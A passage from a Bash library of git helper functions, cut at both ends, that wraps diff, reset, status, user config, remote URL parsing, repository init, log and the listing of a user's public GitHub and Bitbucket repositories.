                _echo_success 'description:' 2 14; _echo_primary 'Continue the rebase or pick operation\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Execute short command
    #--------------------------------------------------

    if [ "$(_is_rebase_in_progress)" = true ]; then
        _echo_info 'git rebase --continue\n'
        git rebase --continue

        return 0
    fi

    #--------------------------------------------------

    _echo_info 'git cherry-pick --continue\n'
    git cherry-pick --continue
}

## Show changes between commits, commit and working tree, etc
function gdiff() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'gdiff (branch_name/commit_hash) -f [file path] -F [file type filter] -n [number] -B (pick branch) -C (pick commit) -l (list files only) -m (diff with main branch) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local command
    local commit_hash
    local diff_filter
    local diff_with_branch=false
    local file_path
    local files_only=false
    local filter
    local number
    local object
    local pick_branch=false
    local pick_commit=false
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789b:BCf:F:lmn:vh option; do
            case "${option}" in
                [1-9]) number="${option}";;
                B) pick_branch=true;;
                C) pick_commit=true;;
                f) file_path="${OPTARG}";;
                F) filter="${OPTARG}";;
                l) files_only=true;;
                m) diff_with_branch=true;;
                n) number="${OPTARG}";;
                v) verbose=true;;
                h) _echo_warning 'gdiff\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Show changes between commits, commit and working tree, etc\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate and get arguments
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${arguments[${LBOUND}]}" ]; then
        object="${arguments[${LBOUND}]}"

        if [ "$(_branch_exists "${object}")" = true ]; then
            branch="${arguments[${LBOUND}]}"

        elif [ "$(_commit_exists "${object}")" = true ]; then
            commit_hash="${arguments[${LBOUND}]}"

        else
            _echo_danger "error: Invalid commit or branch name : \"${object}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # ignored when "commit hash" argument set
    if [ "${pick_branch}" = true ] && [ -z "${commit_hash}" ] && [ -z "${branch}" ]; then
        branch="$(_pick_branch -m)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    # ignored when "commit hash" argument set
    if [ "${pick_commit}" = true ] && [ -z "${commit_hash}" ]; then
        commit_hash=$(_pick_commit "${branch}")
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] || [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    if [ -n "${branch}" ]; then
        diff_with_branch=true
    fi

    if [ "${diff_with_branch}" = true ] || [ -n "${number}" ]; then
        commit_hash=HEAD
    fi

    if [ -z "${branch}" ]; then
        branch=$(_get_main_branch)
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ "${number}" -gt 1 ]; then
        commit_hash="${commit_hash}~$((number - 1))"
    fi

    command='git diff'

    #--------------------------------------------------
    # --diff-filter=ACMR
    # A: Added
    # C: Copied
    # D: Deleted
    # M: Modified
    # R: Renamed
    # U: Unmerged
    #--------------------------------------------------

    # check rebase is in progress
    if [ -d .git/rebase-merge ]; then
        diff_filter='--diff-filter=U'
    else
        diff_filter='--diff-filter=ACMR'
    fi

    if [ "${files_only}" = true ]; then
        command="git --no-pager diff --name-only ${diff_filter}"
    fi

    if [ "${diff_with_branch}" = true ]; then
        command="${command} ${branch}..${commit_hash}"

    elif [ -n "${commit_hash}" ]; then
        command="${command} ${commit_hash}"
    fi

    if [ -n "${filter}" ]; then
        command="${command} \"${filter}\""
    fi

    if [ -n "${file_path}" ]; then
        command="${command} -- \"${file_path}\""
    fi

    if [ "${files_only}" = true ]; then
        command="${command} | sort"
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "$(echo "${command}" | tr -s ' ')\n"
    fi

    eval "${command}"
}

# Get repository url from local config
function get_url() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'get_url -b (branch) -n (new pull request) -p (pull request) -r (repository) -s (server) -u (username) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local current_branch
    local get_branch=false
    local get_new_pr=false
    local get_pull_request=false
    local get_repository=true
    local get_server=false
    local get_username=false
    local git_repository
    local git_server
    local git_username
    local pr_number=false
    local repository_url

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :bnprsuh option; do
        case "${option}" in
            b) get_branch=true; get_new_pr=false;get_pull_request=false;get_repository=false;get_server=false;get_username=false;;
            n) get_branch=false;get_new_pr=true; get_pull_request=false;get_repository=false;get_server=false;get_username=false;;
            p) get_branch=false;get_new_pr=false;get_pull_request=true; get_repository=false;get_server=false;get_username=false;;
            r) get_branch=false;get_new_pr=false;get_pull_request=false;get_repository=true; get_server=false;get_username=false;;
            s) get_branch=false;get_new_pr=false;get_pull_request=false;get_repository=false;get_server=true; get_username=false;;
            u) get_branch=false;get_new_pr=false;get_pull_request=false;get_repository=false;get_server=false;get_username=true;;
            h) _echo_warning 'get_url\n';
                _echo_success 'description:' 2 14; _echo_primary 'Get repository urls from local config\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    repository_url="$(git remote get-url origin)"
    if [ -z "${repository_url}" ]; then
        _echo_danger "error: remote get-url is not available in local git repository\n"
        return 1
    fi

    #--------------------------------------------------
    # Parse url
    #--------------------------------------------------

    if echo "${repository_url}" | grep -q -E '^(http://|https://|git@)'; then
        git_server=$(echo "${repository_url}"     | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f1)
        git_username=$(echo "${repository_url}"   | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f2)
        git_repository=$(echo "${repository_url}" | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f3)
    else
        _echo_danger "error: unknown url format in local git repository\n"
        return 1
    fi

    #--------------------------------------------------

    # format gist url
    if [ "${git_server}" = 'gist.github.com' ]; then
        repository_url="https://${git_server}/${git_username}"
        git_repository="${git_username}"
        git_username=''
    fi

    #--------------------------------------------------

    # convert to url
    if echo "${repository_url}" | grep -q -E '^git@'; then
        # format gist url
        if [ "${git_server}" = 'gist.github.com' ]; then
            repository_url="https://${git_server}/${git_repository}"
        else
            repository_url="https://${git_server}/${git_username}/${git_repository}"
        fi
    fi

    if [ "${get_repository}" = true ]; then
        echo -n "${repository_url}"
        return 0
    fi

    if [ "${get_server}" = true ]; then
        echo -n "${git_server}"
        return 0
    fi

    if [ "${get_username}" = true ]; then
        echo -n "${git_username}"
        return 0
    fi

    current_branch="$(git rev-parse --abbrev-ref HEAD)"

    if [ "${get_branch}" = true ]; then
        if [ "${git_server}" = 'gist.github.com' ]; then
            echo -n "${repository_url}"
            return 0
        fi

        if [ "${git_server}" = 'github.com' ]; then
            echo -n "${repository_url}/tree/${current_branch}"
            return 0
        fi

        if [ "${git_server}" = 'gitlab.com' ]; then
            echo -n "${repository_url}/-/tree/${current_branch}"
            return 0
        fi

        if [ "${git_server}" = 'bitbucket.org' ]; then
            echo -n "${repository_url}/src/${current_branch}"
            return 0
        fi
    fi

    if [ "${get_new_pr}" = true ]; then
        if [ "${git_server}" = 'gist.github.com' ]; then
            _echo_warning 'cannot get pull request url for gist\n'
            return 0
        fi

        if [ "${git_server}" = 'github.com' ]; then
            echo -n "${repository_url}/pull/new/${current_branch}"
            return 0
        fi

        if [ "${git_server}" = 'gitlab.com' ]; then
            echo -n "${repository_url}/merge_requests/new/${current_branch}"
            return 0
        fi

        if [ "${git_server}" = 'bitbucket.org' ]; then
            echo -n "${repository_url}/branch/${current_branch}"
            return 0
        fi
    fi

    if [ "${get_pull_request}" = true ]; then
        if [ "${git_server}" = 'github.com' ] && [ -x "$(command -v gh)" ] && [ -x "$(command -v jq)" ]; then

            # print branch pull request from github
            gh pr view --json url | jq -r '.url'
            return 0
        fi

        pr_number="$(_get_commit_pull_request)"
        if [ -n "${pr_number}" ]; then
            if [ "${git_server}" = 'gist.github.com' ]; then
                _echo_warning 'cannot get pull request url for gist\n'
                return 0
            fi

            if [ "${git_server}" = 'github.com' ]; then
                echo -n "${repository_url}/pull/${pr_number}"
                return 0
            fi

            if [ "${git_server}" = 'gitlab.com' ]; then
                echo -n "${repository_url}/merge_requests/${pr_number}"
                return 0
            fi

            if [ "${git_server}" = 'bitbucket.org' ]; then
                echo -n "${repository_url}/branch/${pr_number}"
                return 0
            fi
        fi
    fi
}

## Reset current branch to a previous commit
function greset() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'greset (commit_hash) -n [number] -o (from remote origin) -H (hard) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command
    local commit_hash
    local current_branch
    local hard=''
    local number
    local origin=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789Hon:h option; do
            case "${option}" in
                [0-9]) number="${option}";;
                H) hard='--hard';;
                n) number="${OPTARG}";;
                o) origin=true;;
                h) _echo_warning 'greset\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Reset current branch to a previous commit\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute short command
    #--------------------------------------------------

    if [ "${origin}" = true ]; then
        fetch -p

        current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"
        if [ -n "${current_branch}" ]; then
            command="$(echo "git reset ${hard} origin/${current_branch}" | tr -s ' ')"
            _echo_info "${command}\n"
            eval "${command}"

            echo
            gstatus -v
            return 0
        fi
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # hash is the only accepted argument
    commit_hash="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${commit_hash}" ]; then
        if [ "$(_commit_exists "${arguments[${LBOUND}]}")" = false ]; then
            _echo_danger "error: Invalid commit hash : \"${commit_hash}\"\n"
            _usage
            return 1
        fi
    fi

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] || [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------

    if [ "${number}" -eq 1 ]; then
        commit_hash=HEAD
    fi

    if [ "${number}" -gt 1 ]; then
        commit_hash="HEAD~$((number - 1))"
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # select commit hash
    if [ -z "${commit_hash}" ]; then
        _echo_info 'git --no-pager log --no-decorate --oneline -n 16\n'
        commit_hash="$(_pick_commit)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Validate argument value
    #--------------------------------------------------

    if [ -n "${commit_hash}" ]; then
        if [ "$(_commit_exists "${commit_hash}")" = false ]; then
            _echo_danger "error: Invalid commit : \"${commit_hash}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    command="$(echo "git reset ${hard} ${commit_hash}" | tr -s ' ')"
    _echo_info "${command}\n"
    eval "${command}"

    echo
    gstatus -v
}

alias gst='gstatus' ## Print TangoMan git status

## Print TangoMan git status
function gstatus() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'gstatus -f (fetch) -vvv (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local commit_ticket
    local current_branch
    local fetch=false
    local latest_tag
    local new_pull_request_url
    local pull_request_url
    local verbose=0

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :fvh option; do
        case "${option}" in
            f) fetch=true;;
            v) verbose=$((verbose + 1));;
            h) _echo_warning 'gstatus\n';
                _echo_success 'description:' 2 14; _echo_primary 'Print git gstatus\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    if [ "${fetch}" = true ]; then
        fetch
    fi

    #--------------------------------------------------

    if [ "${verbose}" -ge 1 ]; then
        guser

        commit_ticket="$(_get_commit_ticket)"
        if [ -n "${commit_ticket}" ]; then
            _echo_info "$(_print_jira_url "${commit_ticket}")\n"
        fi

        _echo_info "$(get_url)\n"
        _echo_info "$(get_url -b)\n"

        current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"
        new_pull_request_url="$(get_url -n)"
        if [ -n "${current_branch}" ] && [ -n "${new_pull_request_url}" ] && [ "$(get_url -s)" != 'gist.github.com' ]; then
            _echo_warning "Create a pull request for \"${current_branch}\" on ${GIT_SERVER} by visiting:\n"
            _echo_info    "    ${new_pull_request_url}\n"
        fi
    fi

    #--------------------------------------------------

    if [ "${verbose}" -ge 2 ]; then
        pull_request_url="$(get_url -p)"
        _echo_info "${pull_request_url}\n"

        if [ "$(get_url -s)" = 'github.com' ]; then
            _echo_info 'gh pr checks\n'
            gh pr checks
        fi
    fi

    #--------------------------------------------------

    if [ "${verbose}" -ge 3 ]; then
        lremote
    fi

    #--------------------------------------------------

    if [ "${verbose}" -ge 4 ]; then
        latest_tag=$(git --no-pager tag --list | tail -1)
        if [ -n "${latest_tag}" ]; then
            _echo_info 'git --no-pager tag --list | tail -1\n'
            echo "${latest_tag}"
        fi

        branch -l
    fi

    #--------------------------------------------------

    _echo_info 'git status\n'
    git status
}

## Print / update git account identity
function guser() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'guser -u [user_name] -e [email] -l (local) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local commit_email
    local commit_name
    local local=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :e:u:lh option; do
        case "${option}" in
            e) commit_email="${OPTARG}";;
            u) commit_name="${OPTARG}";;
            l) local=true;;
            h) _echo_warning 'guser\n';
                _echo_success 'description:' 2 14; _echo_primary 'Print / edit git account identity\n'
                _usage 2 14
                return 0;;
            :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                return 1;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${commit_name}" ]; then
        _echo_info "git config --global user.name \"${commit_name}\"\n"
        git config --global user.name "${commit_name}"
    fi

    if [ -n "${commit_email}" ]; then
        _echo_info "git config --global user.email \"${commit_email}\"\n"
        git config --global user.email "${commit_email}"
    fi

    # set global config to local repository
    if [ "${local}" = true ]; then
        git config --local user.name "$(git config --get --global user.name)"
        git config --local user.email "$(git config --get --global user.email)"
    fi

    # print current git user config
    if [ -n "$(git config --get user.name)" ] && [ -n "$(git config --get user.email)" ]; then
        _echo_primary "$(git config --get user.name) <$(git config --get user.email)>\n"
    else
        if [ -z "$(git config --get --global user.name)" ] && [ -z "$(git config --get --global user.email)" ]; then
            _echo_warning 'missing git default account identity\n'
        else
            _echo_primary "$(git config --get --global user.name) <$(git config --get --global user.email)>\n"
        fi
    fi
}

## Initialize git repository and set remote url
function init() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'init -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local git_repository

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'init\n';
                _echo_success 'description:' 2 14; _echo_primary 'Initialize git repository and set remote url\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info 'git init\n'
    git init

    #--------------------------------------------------

    # default repository name = current working directory (without spaces)
    git_repository="$(basename "$(pwd)" | tr ' ' '-')"

    _echo_success "Remote: Enter git repository name [${git_repository}]: "
    read -r user_prompt

    #--------------------------------------------------

    if [ -n "${user_prompt}" ]; then
        git_repository="${user_prompt}"
    fi

    #--------------------------------------------------

    # add / update remote
    if [ "${GIT_SSH}" = true ]; then

        _echo_info "git remote add origin \"git@${GIT_SERVER}:${GIT_USERNAME}/${git_repository}.git\"\n"
        git remote add origin "git@${GIT_SERVER}:${GIT_USERNAME}/${git_repository}.git"
    else

        _echo_info "git remote add origin \"https://${GIT_SERVER}/${GIT_USERNAME}/${git_repository}\"\n"
        git remote add origin "https://${GIT_SERVER}/${GIT_USERNAME}/${git_repository}"
    fi
}

## Lists bitbucket user public repositories, try browsing "https://bitbucket.org/repo/all
function list-bitbucket() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'list-bitbucket (owner) -p [pages] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local owner
    local pages
    local result

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :p:h option; do
            case "${option}" in
                p) pages="${OPTARG}";;
                h) _echo_warning 'list-bibucket\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Lists bitbucket user public repositories, try browsing "https://bitbucket.org/repo/all"\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check curl installation
    #--------------------------------------------------

    if [ ! -x "$(command -v curl)" ]; then
        _echo_danger 'error: curl required, enter: "sudo apt-get install -y curl" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check jq installation
    #--------------------------------------------------

    if [ ! -x "$(command -v jq)" ]; then
        _echo_danger 'error: jq required, enter: "sudo apt-get install -y jq" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ ${#arguments[@]} -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        owner=${GIT_USERNAME}
    else
        owner="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -z "${owner}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -z "${pages}" ]; then
        result+=$(curl -s "https://api.bitbucket.org/2.0/repositories/${owner}")
    else
        page=1
        while [ "${page}" -le "${pages}" ]; do
            result+=$(curl -s "https://api.bitbucket.org/2.0/repositories/${owner}?page=${page}")
            ((page++))
        done
    fi

    echo "${result}" | jq -r '.values[].links.html.href'
}

## Lists GitHub user repositories
function list-github() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'list-github [owner] -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local owner
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :vh option; do
            case "${option}" in
                v) verbose=true;;
                h) _echo_warning 'list-github\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Lists GitHub user repositories\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check curl installation
    #--------------------------------------------------

    if [ ! -x "$(command -v curl)" ]; then
        _echo_danger 'error: curl required, enter: "sudo apt-get install -y curl" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check jq installation
    #--------------------------------------------------

    if [ ! -x "$(command -v jq)" ]; then
        _echo_danger 'error: jq required, enter: "sudo apt-get install -y jq" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ ${#arguments[@]} -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        owner=${GIT_USERNAME}
    else
        owner="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -z "${owner}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "curl -s \"https://api.github.com/users/${owner}/repos\" | jq -r '.[].html_url'\n"
    fi

    curl -s "https://api.github.com/users/${owner}/repos" | jq -r '.[].html_url'
}

## Print git log
function log() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'log (branch_name/commit_hash) -a [author] -f [file/folder path] -n [number] -B (pick branch) -C (pick commit) -D (no decorate) -l (list files only) -p (show patch) -P (no pager) -g (graph) -G (no graph) -O (name only) -o (oneline) -s (show stat) -S (no stat) -v (show status) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local author
    local branch
    local commit_hash
    local file_path
    local graph='--graph'
    local no_decorate
    local no_summary
    local number
    local object
    local oneline
    local pager
    local patch
    local pick_branch=false
    local pick_commit=false
    local revision_range
    local stats='--stat' # --name-only --name-status --stat

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789a:BCDf:gGln:oOpPhsSv option; do
            case "${option}" in
                [0-9]) number="${option}";pager='--no-pager';graph='';;
                B) pick_branch=true;;
                C) pick_commit=true;pager='--no-pager';graph='';;
                D) no_decorate='--no-decorate';;
                G) graph='';;
                O) stats='--name-only';;
                P) pager='--no-pager';;
                S) stats='';;
                a) author="--author \"${OPTARG}\"";graph='';;
                f) file_path="${OPTARG}";stats='';graph='';;
                g) graph='--graph';;
                l) stats='--name-only';no_summary='--pretty=""';oneline='';graph='';;
                n) number="${OPTARG}";pager='--no-pager';graph='';;
                o) oneline='--oneline';stats='';graph='';;
                p) patch='--patch';graph='';;
                s) stats='--stat';;
                v) stats='--name-status';;
                h) _echo_warning 'log\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Print git log\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate and get arguments
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${arguments[${LBOUND}]}" ]; then
        object="${arguments[${LBOUND}]}"

        if [ "$(_branch_exists "${object}")" = true ]; then
            branch="${arguments[${LBOUND}]}"

        elif [ "$(_commit_exists "${object}")" = true ]; then
            commit_hash="${arguments[${LBOUND}]}"

        else
            _echo_danger "error: Invalid commit or branch name : \"${object}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] && [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # ignored when "branch" argument is set
    if [ "${pick_branch}" = true ] && [ -z "${branch}" ]; then
        _echo_info 'git --no-pager branch --format="%(refname:short)"\n'
        branch="$(_pick_branch -m)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    # ignored when "commit hash" argument is set
    if [ "${pick_commit}" = true ] && [ -z "${commit_hash}" ]; then
        _echo_info "git --no-pager log ${branch} --no-decorate --oneline -n 16\n"
        commit_hash=$(_pick_commit "${branch}")
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

